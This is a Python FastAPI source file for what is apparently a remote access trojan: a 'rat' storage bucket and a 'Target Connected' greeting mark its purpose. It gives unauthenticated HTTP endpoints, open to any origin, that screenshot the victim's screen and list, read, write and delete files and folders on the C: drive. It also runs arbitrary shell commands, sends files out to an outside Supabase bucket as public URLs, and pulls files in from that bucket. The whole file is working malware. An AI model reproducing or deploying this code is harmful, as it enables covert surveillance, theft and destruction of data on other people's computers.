import os
import shutil
import subprocess
from pathlib import Path

import pyautogui
from dotenv import load_dotenv
from fastapi import BackgroundTasks, FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from supabase import Client, create_client

load_dotenv()

supabase: Client = create_client(
    os.getenv("SUPABASE_URL"),
    os.getenv("SUPABASE_KEY"),
)

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/")
def read_root():
    return "Target Connected"


def cleanup_sc():
    if os.path.exists("sc.png"):
        os.remove("sc.png")


@app.get("/screenshot")
def sc(bg_task: BackgroundTasks):

    bg_task.add_task(cleanup_sc)

    _ = pyautogui.screenshot("sc.png")

    return FileResponse("sc.png", media_type="image/jpeg")


@app.get("/getdir")
def get_dir(path: str = ""):

    try:
        files = os.listdir(f"C:/{path}")
        return files
    except FileNotFoundError:
        return "folder not found"


@app.get("/readfile")
def readfile(path: str = ""):
    with open(f"C:/{path}", "r") as f:
        return f.read()


@app.get("/createfile")
def createfile(path: str, content: str):
    Path(f"C:/{path}").touch()

    with open(f"C:/{path}", "w") as f:
        return f.write(content)


@app.get("/removefile")
def removefile(path: str):
    try:
        os.remove(f"C:/{path}")
        return "file deleted"
    except FileNotFoundError:
        return "file not found"


@app.get("/removefolder")
def removefolder(path: str):
    try:
        shutil.rmtree(f"C:/{path}")
        return "folder removed"
    except FileNotFoundError:
        return "folder not found"


# SHOULD BE HANDLED BETTER FOR LARGE FILES #
@app.get("/downloadfile")
def downloadfile(path: str):
    file_name = Path(path).name
    try:
        with open(f"C:/{path}", "rb") as f:
            _ = supabase.storage.from_("rat").upload(
                file=f,
                path=f"./public/{file_name}",
                file_options={"cache-control": "3600", "upsert": "true"},
            )

            url = supabase.storage.from_("rat").get_public_url(f"/public/{file_name}")

            return url

    except Exception as e:
        return f"Error: {str(e)}"


@app.get("/uploadfile")
def uploadfile(dwpath: str, dbfilename: str):
    try:
        with open(f"C:/{dwpath}", "wb+") as f:
            response = supabase.storage.from_("rat").download(f"public/{dbfilename}")
            f.write(response)

            return "file uploaded"

    except Exception as e:
        return f"Error: {str(e)}"


@app.get("/cmd")
def run_cmd(cmd: str, path: str = ""):

    try:
        r = subprocess.run(
            f"{cmd}",
            shell=True,
            capture_output=True,
            cwd=f"C:/{path}",
            check=True,
            text=True,
        )

        return {"stderr": r.stderr, "stdout": r.stdout, "code": r.returncode}

    except subprocess.CalledProcessError as e:
        return f"Command failed with exit code {e.returncode}"
